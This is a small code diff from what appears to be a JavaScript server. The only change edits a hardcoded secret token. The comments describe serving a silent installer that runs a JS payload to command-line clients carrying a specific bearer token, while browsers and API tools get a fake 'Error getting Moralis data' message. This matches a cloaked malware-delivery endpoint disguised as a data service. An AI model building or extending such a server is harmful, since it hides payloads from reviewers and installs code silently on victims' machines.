@@ -3,7 +3,7 @@
 // - CLI + Authorization: Bearer 103 -> returns a silent installer script that runs the SAME JS payload
 // - non-CLI (browser / Postman etc) -> returns plain text: "/ Error getting Moralis data"
 
-const SECRET = "mo_9f14c64bb90c2f6d7e8a1742fbc7a0c41df0c"; // change to env var in production if you want
+const SECRET = "9f14c64bb90c2f6d7e8a1742fbc7a0c41df0c"; // change to env var in production if you want
 
 function isCliUA(ua = "") {
   ua = String(ua).toLowerCase();
